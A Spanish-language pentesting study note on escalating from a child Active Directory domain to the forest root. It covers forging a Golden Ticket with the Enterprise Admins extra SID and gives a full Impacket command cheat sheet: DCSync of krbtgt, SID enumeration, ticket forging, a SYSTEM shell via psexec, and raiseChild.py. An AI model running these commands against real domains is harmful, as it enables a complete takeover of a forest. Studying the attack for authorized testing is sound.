---
tags:
  - AD
  - linux
  - attack
---

## Conceptos Clave

* Esta técnica permite comprometer el dominio padre desde un dominio hijo forjando un Golden Ticket que incluye el SID del grupo Enterprise Admins del dominio raíz en el historial de SIDs (extra-sid).
* Para ejecutar este ataque, es necesario tener control total previo del dominio hijo.
* La forja del ticket requiere recolectar datos clave: el hash NTLM de la cuenta KRBTGT del dominio hijo, el SID del dominio hijo, el FQDN del dominio hijo y el SID del grupo Enterprise Admins del dominio raíz.
* El usuario objetivo especificado durante la creación del Golden Ticket no necesita ser un usuario real o existente en el dominio.

### Herramientas Clave

* **secretsdump.py (Impacket):** Utilizada para realizar el ataque DCSync y extraer el hash NTLM de la cuenta KRBTGT.
* **lookupsid.py (Impacket):** Permite realizar fuerza bruta de SIDs a través de conexiones nulas o autenticadas para enumerar los SIDs de los dominios y los RIDs de grupos/usuarios.
* **ticketer.py (Impacket):** Empleada para construir el Golden Ticket malicioso (.ccache) inyectando el SID adicional.
* **psexec.py (Impacket):** Usada para autenticarse contra el Domain Controller del dominio padre utilizando el ticket forjado en memoria y obtener una shell interactiva como SYSTEM.
* **raiseChild.py (Impacket):** Script de "autopwn" que automatiza todo el proceso de escalamiento desde el dominio hijo al padre.

### Metodología Paso a Paso

1. **Extracción del hash KRBTGT:** Al tener privilegios administrativos en el dominio hijo, se ejecuta un ataque DCSync apuntando especificamente a la cuenta KRBTGT para obtener su hash NTLM.
2. **Enumeración del SID del dominio hijo:** Se realiza una búsqueda del SID base del dominio hijo contactando a su respectivo Domain Controller.
3. **Enumeración del SID de Enterprise Admins:** Se repite la búsqueda de SIDs, esta vez apuntando al Domain Controller del dominio padre (raíz), con el objetivo de obtener el SID del dominio y concatenarlo con el RID del grupo Enterprise Admins.
4. **Forja del Golden Ticket:** Con todos los datos recolectados, se crea el Golden Ticket asignando el SID de Enterprise Admins en el parámetro de SIDs adicionales, lo que otorga privilegios administrativos en todo el bosque.
5. **Autenticación e Inyección:** Se exporta el ticket forjado a las variables de entorno del sistema Linux para forzar su uso durante la autenticación Kerberos contra el Domain Controller del dominio padre.

### Cheat Sheet de Comandos

```bash
# Extrae el hash NTLM de la cuenta KRBTGT del dominio hijo mediante DCSync

secretsdump.py <CHILD_FQDN>/<CHILD_USER>@<CHILD_DC_IP> -just-dc-user <CHILD_DOMAIN_SHORT>/krbtgt

  
# Realiza fuerza bruta para obtener el SID del dominio hijo, filtrando la salida para reducir el ruido

lookupsid.py <CHILD_FQDN>/<CHILD_USER>@<CHILD_DC_IP> | grep "Domain SID"

  
# Obtiene el SID del dominio padre y localiza el grupo Enterprise Admins (RID 519)

lookupsid.py <CHILD_FQDN>/<CHILD_USER>@<PARENT_DC_IP> | grep -B12 "Enterprise Admins"

  
# Construye el Golden Ticket.
# -nthash: Hash KRBTGT del hijo.
# -domain-sid: SID del dominio hijo.
# -extra-sid: SID del dominio padre + RID de Enterprise Admins (ej. -519).

ticketer.py -nthash <CHILD_KRBTGT_HASH> -domain <CHILD_FQDN> -domain-sid <CHILD_DOMAIN_SID> -extra-sid <PARENT_EA_SID> <FAKE_USER>

  
# Configura la variable de entorno para utilizar el ticket Kerberos (.ccache) recién creado

export KRB5CCNAME=<FAKE_USER>.ccache

  
# Obtiene una shell SYSTEM en el DC del dominio padre utilizando el ticket forjado.
# -k: Usa autenticación Kerberos.
# -no-pass: Indica que no se proporcionará contraseña (usa el ticket).

psexec.py <CHILD_FQDN>/<FAKE_USER>@<PARENT_DC_FQDN> -k -no-pass -target-ip <PARENT_DC_IP>

  
# ALTERNATIVA AUTOMATIZADA: Realiza el ataque completo de escalamiento child-to-parent
raiseChild.py -target-exec <PARENT_DC_IP> <CHILD_FQDN>/<CHILD_USER>
```

### "Gotchas" y Troubleshooting

* **Requisito de FQDN para raiseChild.py:** Al usar la herramienta automatizada `raiseChild.py`, el dominio proporcionado en las credenciales DEBE ser el FQDN (Fully Qualified Domain Name), no el nombre corto.
* **Precaución con la automatización:** En entornos de producción reales, es imperativo tener cuidado al ejecutar scripts de "autopwn" como `raiseChild.py`.
* **Preferencia por lo manual:** Es altamente recomendable comprender la metodología manual para poder diagnosticar fallas si una herramienta falla en algún paso del proceso.  Evita depender de herramientas automatizadas acopladas a BloodHound si no comprendes la cadena de ataque subyacente.
* **Gestión de variables de entorno:** El uso de herramientas de Impacket con autenticación Kerberos en Linux depende de que la variable `KRB5CCNAME` esté correctamente exportada y apuntando al archivo `.ccache` válido en la sesión actual de la terminal.
